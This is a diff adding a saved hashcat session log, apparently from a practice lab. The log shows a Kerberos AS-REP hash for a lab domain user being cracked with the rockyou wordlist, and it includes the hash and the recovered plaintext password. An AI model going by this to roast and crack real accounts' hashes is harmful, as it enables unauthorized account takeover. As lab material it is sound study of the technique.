@@ -1,0 +1,36 @@
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:fb31ac07af6865373efb1c382fd94fbb$3481aee01a4358514d3c91159289ef50cab7c272feb961d3ce70d679e7968aaf43fba6e45f90bdb3311d52aa8caa8a801757e9f6e6c49a391a0286feb2285cca1d0340a165346e95254f08e0da304fd34aa404043fa80be0091ff5c825ba4f72ecb91fbb565ddf95bbcfeda91c1cd801396136871495936f81c7364f533b19c52eba61796182d8ee9b742986bffa407711e759bbd3c42235e6511bfd65f92cd4f8560fd75afde5ffbfc04a71ceb0cdb9e4f700da89debabf2eba57b7d3ee2911c1e7d5e9e5c413acb97c798fadcd55d6ea19ab2fa74c13b3ab4c110992f5bde0cffaa8f9ed0c594937afdb8f5f879623c4dc20f936d1:tj072889*
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:fb31ac07af68...f936d1
+Time.Started.....: Thu Jun 15 20:28:46 2023 (0 secs)
+Time.Estimated...: Thu Jun 15 20:28:46 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  7811.4 kH/s (1.71ms) @ Accel:256 Loops:1 Thr:32 Vec:1
+Speed.#2.........:   165.7 kH/s (9.55ms) @ Accel:16 Loops:1 Thr:8 Vec:1
+Speed.#*.........:  7977.2 kH/s
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3262464/14344384 (22.74%)
+Rejected.........: 0/3262464 (0.00%)
+Restore.Point....: 3010560/14344384 (20.99%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: tyisgay1 -> theagonist
+Candidates.#2....: theagold -> thaued
+Hardware.Mon.#1..: Temp: 54c Util: 13% Core:1702MHz Mem:7000MHz Bus:8
+Hardware.Mon.#2..: N/A
+
+Started: Thu Jun 15 20:28:22 2023
+Stopped: Thu Jun 15 20:28:47 2023
+
+C:\Users\gbrit\Downloads\hashcat-6.2.6\hashcat-6.2.6>
